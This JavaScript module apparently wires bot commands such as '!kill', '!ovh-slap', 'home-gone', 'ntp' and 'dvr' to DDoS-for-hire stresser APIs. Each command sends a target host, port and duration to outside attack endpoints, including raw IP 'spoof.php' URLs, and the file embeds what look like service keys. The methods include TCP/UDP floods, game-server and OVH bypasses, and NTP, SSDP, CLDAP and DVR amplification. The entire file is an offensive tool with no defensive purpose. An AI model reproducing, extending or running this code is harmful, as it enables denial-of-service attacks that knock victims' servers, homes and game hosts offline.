const { all, get } = require("axios");

class Attack {
    static async send(host, port, time, method) {
        switch(method.toLowerCase()) {
            // Layer 7
            case "!kill": 
                all([ 
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=TCP`)
                ]);
            case "!quartz-tcp":
                all([
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=TCP`)
                ]);
                break;
            case "!quartz-xtd":
                all([
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=TCP`)
                ]);
                break;
            case "!quartz-hex":
                all([
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=TCP`)
                ]);
                break;
            // Server Bypasses
            case "!quartz-udp":
                all([
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=UDP`)
                ]);
                break;
            case "!quartz-hold":
                all([
					get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=HOME`)
                ]);
                break;
             case "!quartz-l7":
                all([
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=BROWSER`)
                ]);
                break;
            case "!quartz-tls":
                all([
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=TLS`)
                ]);
                break;
            case "!ovh-vpn":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&port=${port}&time=${time}&method=PORT-KILL`),
                    get(`https://stormapi.xyz/AllAPI.php?key=LOGICTHAGOD-07/08/2021-KERGKERGKERG&host=${host}&port=${port}&time=${time}&method=TCP`)
                ]);
                break;
            case "!ovh-slap":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=NET-CRASHV3`)         
                ]);


                break;
            case "!ovh-cpu":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=PORT-KILL`)         
                ]);
                break;
            case "!ovh-tcp":
                all([
                    get(`https://stormapi.xyz/AllAPI.php?key=LOGICTHAGOD-07/08/2021-KERGKERGKERG&host=${host}&port=${port}&time=${time}&method=TCP`),
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=TCP2`)
                ]);
                break;
            // Game Bypasses
            case "!nfo-slap":
                all([
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=TCP`)
                ]);
                break;
            case "!ovh-quartz":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=`)
                ]);
                break;
            case "!nfo-quartz":
                all([
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=TCP`)
                ]);
                break;
            // Home
            case "home-gone":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=CLDAP`),
                    get(`https://stormapi.xyz/AllAPI.php?key=LOGICTHAGOD-07/08/2021-KERGKERGKERG&host=${host}&port=${port}&time=${time}&method=STD`),
                    get(`http://45.61.188.175/spoof.php?host=${host}&port=${port}&time=${time}&method=HOME-HOLD`)
                ]);
                break;
            // Amplification
            case "ntp":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=NTP`)         
                ]);
                break; 
            case "ssdp":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=SSDP`)         
                ]);
                break;
  	        case "dvr":
          		all([
          		      get(`http://194.85.249.36/spoof.php?host=${host}&port=${port}&time=${time}&method=DVR`),
                    get(`http://176.126.175.209/spoof.php?&host=${host}&port=${port}&time=${time}&method=DVR`)
          		]);
        }
    }
}

module.exports = Attack;